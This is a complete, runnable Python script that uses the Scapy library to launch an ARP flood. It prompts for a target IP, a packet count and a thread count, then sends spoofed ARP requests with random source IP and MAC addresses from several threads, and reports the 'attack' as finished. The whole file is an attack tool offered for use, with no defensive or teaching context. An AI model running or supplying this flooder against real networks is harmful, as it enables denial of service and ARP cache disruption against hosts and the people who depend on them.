from scapy.all import *
import os
import threading

def arp_flood(target_ip, num_packets):
    for _ in range(num_packets):
        arp_packet = ARP(op=1, pdst=target_ip, psrc=RandIP(), hwsrc=RandMAC())
        send(arp_packet, verbose=False)

def main():
        os.system("clear")
        target_ip = input("Enter the target IP: ")
        num_packets = int(input("Enter the number of packets: "))
        thread_count = int(input("Enter the number of threads: "))

        num_packets_per_thread = num_packets // thread_count

        threads = []
        for _ in range(thread_count):
            thread = threading.Thread(target=arp_flood, args=(target_ip, num_packets_per_thread))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        print(f"ARP Flood attack finished: {num_packets}")


if __name__ == "__main__":
    main()
